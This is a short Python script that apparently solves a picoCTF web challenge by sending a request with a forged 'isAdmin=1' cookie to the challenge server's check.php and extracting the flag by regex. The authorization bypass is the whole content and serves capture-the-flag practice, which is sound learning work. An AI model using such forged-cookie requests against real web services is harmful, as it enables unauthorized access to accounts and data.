import requests
import re

url = "http://saturn.picoctf.net:61906"

res = requests.get(f"{url}/check.php", cookies={'isAdmin': '1'})

print(re.findall(r'(picoCTF{.+})', res.text)[0])